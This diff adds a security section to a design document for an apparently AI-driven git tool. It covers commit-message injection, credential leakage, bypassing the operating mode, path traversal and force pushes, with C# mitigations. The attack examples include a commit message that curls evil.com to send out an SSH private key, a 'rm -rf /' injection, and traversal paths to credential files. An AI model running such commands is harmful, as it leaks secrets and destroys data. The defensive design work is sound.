@@ -375,6 +375,697 @@ $ acode git push
 
 ---
 
+## Security Considerations
+
+### Threat 1: Commit Message Injection for Command Execution
+
+**Risk:** CRITICAL - Malicious commit messages containing shell metacharacters could execute arbitrary commands if passed unsafely to shell.
+
+**Attack Scenario:**
+```bash
+# Attacker provides malicious commit message
+acode git commit "feat: feature\n$(curl evil.com/exfil?data=$(cat ~/.ssh/id_rsa))"
+
+# Or via message with backticks
+acode git commit "fix: bug\`whoami > /tmp/pwned\`"
+
+# Or with subshell
+acode git commit "docs: update; rm -rf / #"
+```
+
+If commit message is passed to shell unsafely (e.g., via bash -c "git commit -m '$message'"), this could:
+- Execute arbitrary commands on host system
+- Exfiltrate sensitive data (SSH keys, env vars, source code)
+- Modify or delete files outside repository
+- Establish backdoors or persistence mechanisms
+- Compromise CI/CD pipeline if message propagated to build scripts
+
+**Mitigation:**
+
+```csharp
+// CommitMessageValidator.cs - Sanitize and validate commit messages
+namespace Acode.Application.Git;
+
+public sealed class CommitMessageValidator : ICommitMessageValidator
+{
+    private static readonly char[] DangerousChars =
+    {
+        '$', '`', '\n', '\r', ';', '&', '|', '<', '>',
+        '(', ')', '{', '}', '\\', '"', '\''
+    };
+
+    private static readonly Regex CommitMessageFormat = new(
+        @"^(feat|fix|docs|style|refactor|test|chore)(\(.+?\))?: .{10,500}$",
+        RegexOptions.Compiled | RegexOptions.Singleline);
+
+    private readonly ILogger<CommitMessageValidator> _logger;
+    private readonly IConfiguration _config;
+
+    public ValidationResult Validate(string message)
+    {
+        var errors = new List<string>();
+        var warnings = new List<string>();
+
+        // Check for null/empty
+        if (string.IsNullOrWhiteSpace(message))
+        {
+            errors.Add("Commit message cannot be empty");
+            return new ValidationResult(false, errors, warnings);
+        }
+
+        // Check for dangerous characters (shell metacharacters)
+        foreach (var dangerousChar in DangerousChars)
+        {
+            if (message.Contains(dangerousChar))
+            {
+                var charDisplay = dangerousChar switch
+                {
+                    '\n' => "\\n (newline)",
+                    '\r' => "\\r (carriage return)",
+                    _ => $"'{dangerousChar}'"
+                };
+
+                errors.Add($"Commit message contains dangerous character: {charDisplay} (possible injection attempt)");
+                _logger.LogWarning("SECURITY: Commit message injection attempt detected: {Message}", message.Take(50));
+                return new ValidationResult(false, errors, warnings); // Fail fast on injection
+            }
+        }
+
+        // Check length (Git has 72-char subject line convention, but allow up to 500 total)
+        if (message.Length > 500)
+        {
+            errors.Add($"Commit message exceeds 500 characters (got {message.Length})");
+        }
+
+        if (message.Length < 10)
+        {
+            errors.Add("Commit message too short (minimum 10 characters)");
+        }
+
+        // Validate conventional commit format if configured
+        if (_config.EnforceConventionalCommits)
+        {
+            if (!CommitMessageFormat.IsMatch(message))
+            {
+                errors.Add("Commit message does not follow conventional format: type(scope): description");
+                warnings.Add("Expected format: feat|fix|docs|style|refactor|test|chore(scope): description");
+            }
+        }
+
+        // Check for common issues
+        if (message.StartsWith("WIP", StringComparison.OrdinalIgnoreCase) ||
+            message.StartsWith("TODO", StringComparison.OrdinalIgnoreCase))
+        {
+            warnings.Add("Commit message starts with WIP/TODO - is this ready to commit?");
+        }
+
+        if (message.All(char.IsUpper) && message.Length > 20)
+        {
+            warnings.Add("Commit message is all caps - consider using sentence case");
+        }
+
+        // Check for URLs (might contain credentials)
+        if (message.Contains("http://") || message.Contains("https://"))
+        {
+            warnings.Add("Commit message contains URL - ensure no credentials embedded");
+        }
+
+        return new ValidationResult(errors.Count == 0, errors, warnings);
+    }
+
+    public string Sanitize(string message)
+    {
+        // Strip any shell metacharacters as last resort
+        foreach (var dangerous in DangerousChars)
+        {
+            message = message.Replace(dangerous.ToString(), "");
+        }
+
+        // Limit length
+        if (message.Length > 500)
+        {
+            message = message[..500];
+        }
+
+        return message.Trim();
+    }
+}
+
+// Apply validation in CommitAsync
+public async Task<GitCommit> CommitAsync(
+    string workingDir,
+    string message,
+    CommitOptions? options = null,
+    CancellationToken ct = default)
+{
+    options ??= new CommitOptions();
+
+    // ALWAYS validate message before ANY git operations
+    var validation = _commitMessageValidator.Validate(message);
+    if (!validation.IsValid)
+    {
+        _logger.LogWarning("Commit message validation failed: {Errors}", string.Join(", ", validation.Errors));
+        throw new InvalidCommitMessageException(message, validation.Errors);
+    }
+
+    // Log warnings but don't fail
+    foreach (var warning in validation.Warnings)
+    {
+        _logger.LogInformation("Commit message warning: {Warning}", warning);
+    }
+
+    // CRITICAL: Use parameterized command execution, NEVER shell string interpolation
+    // BAD:  await ExecuteShellAsync($"git commit -m \"{message}\"");
+    // GOOD: await ExecuteGitAsync(workingDir, new[] { "commit", "-m", message }, ct);
+
+    var args = new List<string> { "commit", "-m", message }; // Message passed as separate argument
+
+    // ... rest of commit logic
+}
+```
+
+### Threat 2: Credential Exposure in Push Operations and Logs
+
+**Risk:** HIGH - Credentials (HTTPS tokens, SSH keys) exposed in logs, error messages, or remote URLs.
+
+**Attack Scenario:**
+```bash
+# HTTPS remote with embedded token
+git remote add origin https://token:ghp_abc123secrettoken@github.com/user/repo.git
+acode git push
+
+# Push fails with authentication error - error message leaks token
+ERROR: Failed to push to https://token:ghp_abc123secrettoken@github.com/user/repo.git
+# Token now visible in logs, console output, CI/CD logs
+
+# Or attacker retrieves credential from config
+git config --get remote.origin.url
+# Returns: https://token:ghp_abc123secrettoken@github.com/user/repo.git
+```
+
+Credential exposure leads to:
+- Unauthorized repository access
+- Code exfiltration or tampering
+- Account compromise and privilege escalation
+- Supply chain attacks via compromised repos
+
+**Mitigation:**
+
+```csharp
+// CredentialRedactor.cs - Redact credentials from URLs and output
+namespace Acode.Infrastructure.Git;
+
+public sealed class CredentialRedactor : ICredentialRedactor
+{
+    // Matches: https://user:password@host.com, https://token@host.com, https://oauth2:token@host.com
+    private static readonly Regex HttpsCredentialPattern = new(
+        @"(https?://)[^:/@]+:[^@]+@",
+        RegexOptions.Compiled | RegexOptions.IgnoreCase);
+
+    // Matches: ghp_abc123, glpat-abc123, github_pat_abc123
+    private static readonly Regex TokenPattern = new(
+        @"\b(ghp_[a-zA-Z0-9]{36}|glpat-[a-zA-Z0-9]{20}|github_pat_[a-zA-Z0-9_]{82})\b",
+        RegexOptions.Compiled);
+
+    // Matches SSH private key content
+    private static readonly Regex SshKeyPattern = new(
+        @"-----BEGIN [A-Z ]+PRIVATE KEY-----[\s\S]+?-----END [A-Z ]+PRIVATE KEY-----",
+        RegexOptions.Compiled);
+
+    public string RedactUrl(string url)
+    {
+        if (string.IsNullOrEmpty(url))
+            return url;
+
+        // Redact credentials from HTTPS URLs
+        // Before: https://user:token@github.com/repo.git
+        // After:  https://[REDACTED]@github.com/repo.git
+        return HttpsCredentialPattern.Replace(url, "$1[REDACTED]@");
+    }
+
+    public string RedactOutput(string output)
+    {
+        if (string.IsNullOrEmpty(output))
+            return output;
+
+        // Redact URLs
+        output = HttpsCredentialPattern.Replace(output, "$1[REDACTED]@");
+
+        // Redact tokens
+        output = TokenPattern.Replace(output, match =>
+        {
+            var token = match.Value;
+            var prefix = token[..8]; // Show first 8 chars for debugging
+            return $"{prefix}***[REDACTED]";
+        });
+
+        // Redact SSH keys
+        output = SshKeyPattern.Replace(output, "-----BEGIN PRIVATE KEY-----\n[REDACTED]\n-----END PRIVATE KEY-----");
+
+        return output;
+    }
+
+    public PushResult RedactPushResult(PushResult result)
+    {
+        // Ensure PushResult never contains raw credentials
+        return result with
+        {
+            Remote = RedactUrl(result.Remote),
+            RefUpdates = result.RefUpdates.Select(ru => ru with
+            {
+                RefName = RedactUrl(ru.RefName)
+            }).ToList()
+        };
+    }
+}
+
+// Apply redaction in PushAsync
+public async Task<PushResult> PushAsync(
+    string workingDir,
+    PushOptions? options = null,
+    CancellationToken ct = default)
+{
+    // ... mode validation, setup ...
+
+    CommandResult result;
+    try
+    {
+        result = await _pushRetryPolicy.ExecuteWithRetryAsync(
+            async () => await ExecuteGitAsync(workingDir, args, ct),
+            ct);
+    }
+    catch (GitException ex)
+    {
+        // CRITICAL: Redact credentials from all exception messages/output
+        var redactedMessage = _credentialRedactor.RedactOutput(ex.Message);
+        var redactedStdErr = _credentialRedactor.RedactOutput(ex.StdErr ?? "");
+
+        _logger.LogError("Push failed (redacted): {Message}", redactedMessage);
+
+        if (redactedStdErr.Contains("Authentication failed"))
+        {
+            throw new AuthenticationException(redactedStdErr, workingDir);
+        }
+
+        if (redactedStdErr.Contains("rejected"))
+        {
+            throw new PushRejectedException(redactedStdErr, workingDir);
+        }
+
+        // Re-throw with redacted information
+        throw new GitException(redactedMessage, ex.ExitCode, redactedStdErr, workingDir, "GIT_022C_PUSH_FAILED");
+    }
+
+    // Get remote URL for logging - MUST redact before logging
+    var remoteUrl = await GetRemoteUrlAsync(workingDir, remote, ct);
+    var redactedUrl = _credentialRedactor.RedactUrl(remoteUrl);
+    _logger.LogInformation("Pushed {Branch} to {Remote} ({Url})", branch, remote, redactedUrl);
+
+    // Redact PushResult before returning
+    var pushResult = new PushResult
+    {
+        Success = true,
+        Remote = redactedUrl, // Redacted!
+        Branch = branch,
+        RefUpdates = refUpdates,
+        Duration = stopwatch.Elapsed
+    };
+
+    return _credentialRedactor.RedactPushResult(pushResult);
+}
+
+// GetRemoteUrlAsync helper
+private async Task<string> GetRemoteUrlAsync(string workingDir, string remote, CancellationToken ct)
+{
+    var result = await ExecuteGitAsync(
+        workingDir,
+        new[] { "remote", "get-url", remote },
+        ct);
+
+    return result.StdOut.Trim();
+}
+```
+
+### Threat 3: Operating Mode Bypass for Data Exfiltration via Push
+
+**Risk:** CRITICAL - Attacker bypasses LocalOnly or Airgapped mode restrictions to push code to external remote, exfiltrating proprietary source code.
+
+**Attack Scenario:**
+```csharp
+// System configured in LocalOnly mode (no network access)
+// Attacker exploits race condition or mode check bypass
+
+// Attack 1: TOCTOU (Time-of-Check-Time-of-Use) race
+var mode = await modeResolver.GetCurrentModeAsync(); // Returns LocalOnly
+// [Attacker changes mode file here via separate process]
+await git.PushAsync(workingDir); // Push executes before second mode check
+
+// Attack 2: Direct git command bypass
+Process.Start("git", "push origin main"); // Bypasses IGitService mode enforcement
+
+// Attack 3: Configuration tampering
+// Attacker modifies .agent/config.yml to change mode from LocalOnly to Burst
+// Agent reads stale config, allows push
+```
+
+Successful mode bypass leads to:
+- Intellectual property theft (proprietary code pushed to attacker-controlled remote)
+- Trade secret disclosure
+- Compliance violations (ITAR, EAR, data residency requirements)
+- Supply chain compromise (malicious code pushed to internal repos)
+
+**Mitigation:**
+
+```csharp
+// ModeEnforcementService.cs - Robust mode enforcement with tamper detection
+namespace Acode.Application.OperatingModes;
+
+public sealed class ModeEnforcementService : IModeEnforcementService
+{
+    private readonly IOperatingModeResolver _modeResolver;
+    private readonly IConfigurationService _config;
+    private readonly IAuditLogger _auditLogger;
+    private readonly ILogger<ModeEnforcementService> _logger;
+    private readonly SemaphoreSlim _modeLock = new(1, 1);
+
+    public async Task EnforceNetworkOperationAsync(
+        string operation,
+        string workingDir,
+        CancellationToken ct)
+    {
+        // Acquire lock to prevent TOCTOU attacks
+        await _modeLock.WaitAsync(ct);
+        try
+        {
+            // Get mode with tamper detection
+            var mode = await _modeResolver.GetCurrentModeWithIntegrityCheckAsync(ct);
+
+            // Check if operation permitted in current mode
+            if (mode == OperatingMode.LocalOnly)
+            {
+                _logger.LogWarning(
+                    "SECURITY: Network operation '{Operation}' blocked by LocalOnly mode in {Dir}",
+                    operation, workingDir);
+
+                _auditLogger.LogSecurityEvent(new AuditEvent
+                {
+                    EventType = "ModeViolation",
+                    Severity = AuditSeverity.Critical,
+                    Message = $"Attempted {operation} in LocalOnly mode",
+                    WorkingDirectory = workingDir,
+                    Timestamp = DateTimeOffset.UtcNow
+                });
+
+                throw new ModeViolationException(
+                    mode.ToString(),
+                    operation,
+                    "Network operations are not permitted in LocalOnly mode");
+            }
+
+            if (mode == OperatingMode.Airgapped)
+            {
+                _logger.LogWarning(
+                    "SECURITY: Network operation '{Operation}' blocked by Airgapped mode in {Dir}",
+                    operation, workingDir);
+
+                _auditLogger.LogSecurityEvent(new AuditEvent
+                {
+                    EventType = "ModeViolation",
+                    Severity = AuditSeverity.Critical,
+                    Message = $"Attempted {operation} in Airgapped mode",
+                    WorkingDirectory = workingDir,
+                    Timestamp = DateTimeOffset.UtcNow
+                });
+
+                throw new ModeViolationException(
+                    mode.ToString(),
+                    operation,
+                    "Network operations are not permitted in Airgapped mode");
+            }
+
+            // Burst mode: Network operations allowed
+            _logger.LogInformation("Network operation '{Operation}' permitted in Burst mode", operation);
+
+            // Audit successful network operation authorization
+            _auditLogger.LogAuditEvent(new AuditEvent
+            {
+                EventType = "NetworkOperationAuthorized",
+                Severity = AuditSeverity.Information,
+                Message = $"{operation} authorized in {mode} mode",
+                WorkingDirectory = workingDir,
+                Timestamp = DateTimeOffset.UtcNow
+            });
+        }
+        finally
+        {
+            _modeLock.Release();
+        }
+    }
+}
+
+// Enhanced PushAsync with robust mode enforcement
+public async Task<PushResult> PushAsync(
+    string workingDir,
+    PushOptions? options = null,
+    CancellationToken ct = default)
+{
+    options ??= new PushOptions();
+    var stopwatch = Stopwatch.StartNew();
+
+    // CRITICAL: Enforce mode check with lock and tamper detection
+    // This MUST happen before ANY network operations
+    await _modeEnforcementService.EnforceNetworkOperationAsync("push", workingDir, ct);
+
+    // Additional mode re-check immediately before network call (defense in depth)
+    var mode = await _modeResolver.GetCurrentModeWithIntegrityCheckAsync(ct);
+    if (mode != OperatingMode.Burst)
+    {
+        // Should never reach here due to EnforceNetworkOperationAsync, but defense in depth
+        _logger.LogCritical("SECURITY: Mode changed between enforcement and execution");
+        throw new ModeViolationException(mode.ToString(), "push");
+    }
+
+    // ... rest of push implementation ...
+}
+
+// OperatingModeResolver with integrity checking
+public async Task<OperatingMode> GetCurrentModeWithIntegrityCheckAsync(CancellationToken ct)
+{
+    // Read mode from config
+    var config = await _configService.ReadConfigAsync(ct);
+    var declaredMode = config.OperatingMode;
+
+    // Verify config file has not been tampered with
+    var configPath = _configService.GetConfigPath();
+    var configHash = await ComputeFileHashAsync(configPath, ct);
+
+    // Compare with expected hash (stored securely, e.g., signed by installation)
+    if (!await VerifyConfigIntegrityAsync(configPath, configHash, ct))
+    {
+        _logger.LogCritical("SECURITY: Configuration file integrity check failed - possible tampering");
+        _auditLogger.LogSecurityEvent(new AuditEvent
+        {
+            EventType = "ConfigTampered",
+            Severity = AuditSeverity.Critical,
+            Message = "Config integrity verification failed",
+            Timestamp = DateTimeOffset.UtcNow
+        });
+
+        // Fail secure: Assume most restrictive mode
+        return OperatingMode.Airgapped;
+    }
+
+    return declaredMode;
+}
+```
+
+### Threat 4: Path Traversal via Malicious Staging Paths
+
+**Risk:** MEDIUM - Attacker stages files outside repository boundary, potentially adding sensitive files to commits.
+
+**Attack Scenario:**
+```csharp
+// Attacker attempts to stage files outside repo
+await git.StageAsync(workingDir, new[] {
+    "../../etc/passwd",           // Absolute path escape
+    "../../../home/user/.ssh/id_rsa", // SSH key exfiltration
+    "../../.env",                 // Environment variables
+    "symlink-to-sensitive-file"   // Symlink escape
+});
+
+// If staging succeeds, next commit includes sensitive system files
+await git.CommitAsync(workingDir, "feat: add feature");
+await git.PushAsync(workingDir); // Sensitive files pushed to remote
+```
+
+This could lead to:
+- Sensitive system files committed and pushed
+- Credential exposure
+- Personal data leakage
+- Compliance violations
+
+**Mitigation:**
+
+```csharp
+// PathValidator.cs - Validate and sanitize file paths for staging
+namespace Acode.Infrastructure.Git;
+
+public sealed class PathValidator : IPathValidator
+{
+    public ValidationResult ValidateForStaging(string workingDir, string path)
+    {
+        var errors = new List<string>();
+
+        // Normalize path
+        var normalizedPath = Path.GetFullPath(Path.Combine(workingDir, path));
+
+        // Check path stays within repository boundary
+        if (!normalizedPath.StartsWith(workingDir, StringComparison.Ordinal))
+        {
+            errors.Add($"Path escapes repository boundary: {path}");
+            return new ValidationResult(false, errors);
+        }
+
+        // Check for symlink (potential escape mechanism)
+        if (File.Exists(normalizedPath))
+        {
+            var fileInfo = new FileInfo(normalizedPath);
+            if (fileInfo.Attributes.HasFlag(FileAttributes.ReparsePoint))
+            {
+                errors.Add($"Path is a symlink (potential security risk): {path}");
+            }
+        }
+
+        // Check file actually exists
+        if (!File.Exists(normalizedPath) && !Directory.Exists(normalizedPath))
+        {
+            errors.Add($"Path does not exist: {path}");
+        }
+
+        return new ValidationResult(errors.Count == 0, errors);
+    }
+}
+
+// Apply validation in StageAsync
+public async Task<StageResult> StageAsync(
+    string workingDir,
+    IEnumerable<string> paths,
+    StageOptions? options = null,
+    CancellationToken ct = default)
+{
+    // Validate ALL paths before staging ANY
+    var pathList = paths.ToList();
+    foreach (var path in pathList)
+    {
+        var validation = _pathValidator.ValidateForStaging(workingDir, path);
+        if (!validation.IsValid)
+        {
+            _logger.LogWarning("Path validation failed for staging: {Path}, Errors: {Errors}",
+                path, string.Join(", ", validation.Errors));
+            throw new InvalidPathException(path, validation.Errors);
+        }
+    }
+
+    // ... proceed with staging ...
+}
+```
+
+### Threat 5: Destructive Force Push Without Authorization
+
+**Risk:** MEDIUM - Unauthorized force push overwrites remote history, causing data loss and breaking collaborator workflows.
+
+**Attack Scenario:**
+```bash
+# Attacker force pushes to shared branch
+acode git push --force
+
+# Overwrites remote history, loses commits from other developers
+# Breaks CI/CD pipelines expecting specific commit SHAs
+# Violates branch protection policies
+```
+
+Consequences:
+- Permanent loss of commits and work
+- Broken pull requests and code reviews
+- CI/CD pipeline failures
+- Team productivity impact
+- Audit trail destruction
+
+**Mitigation:**
+
+```csharp
+// ForcePushGuard.cs - Require explicit authorization for destructive operations
+namespace Acode.Application.Git;
+
+public sealed class ForcePushGuard : IForcePushGuard
+{
+    private readonly ILogger<ForcePushGuard> _logger;
+    private readonly IAuditLogger _auditLogger;
+
+    public async Task<ForcePushAnalysis> AnalyzeForcePush(
+        string workingDir,
+        string remote,
+        string branch,
+        CancellationToken ct)
+    {
+        // Check if remote branch would be force-overwritten
+        var localSha = await _git.GetBranchShaAsync(workingDir, branch, ct);
+        var remoteSha = await _git.GetRemoteBranchShaAsync(workingDir, remote, branch, ct);
+
+        var analysis = new ForcePushAnalysis
+        {
+            IsForceRequired = !await IsAncestorAsync(workingDir, remoteSha, localSha, ct),
+            LocalSha = localSha,
+            RemoteSha = remoteSha
+        };
+
+        if (analysis.IsForceRequired)
+        {
+            // Determine what would be lost
+            var lostCommits = await GetCommitsNotInLocalAsync(workingDir, localSha, remoteSha, ct);
+            analysis.CommitsToBeOverwritten = lostCommits;
+            analysis.Warning = $"Force push will overwrite {lostCommits.Count} remote commits";
+
+            _logger.LogWarning(
+                "Force push would overwrite {Count} commits on {Remote}/{Branch}",
+                lostCommits.Count, remote, branch);
+        }
+
+        return analysis;
+    }
+
+    public void RequireAuthorization(ForcePushAnalysis analysis, PushOptions options)
+    {
+        if (!analysis.IsForceRequired)
+            return; // Not a force push scenario
+
+        // Force push MUST be explicitly authorized
+        if (!options.Force && !options.ForceWithLease)
+        {
+            throw new UnauthorizedOperationException(
+                "Force push detected but not authorized. Use --force or --force-with-lease.");
+        }
+
+        // Recommend --force-with-lease over --force
+        if (options.Force && !options.ForceWithLease)
+        {
+            _logger.LogWarning("Using --force instead of safer --force-with-lease");
+        }
+
+        // Audit force push attempts
+        _auditLogger.LogAuditEvent(new AuditEvent
+        {
+            EventType = "ForcePushAttempt",
+            Severity = AuditSeverity.Warning,
+            Message = $"Force push: {analysis.CommitsToBeOverwritten.Count} commits will be overwritten",
+            Timestamp = DateTimeOffset.UtcNow
+        });
+    }
+}
+```
+
+---
+
 ## Best Practices
 
 ### Staging (Add)
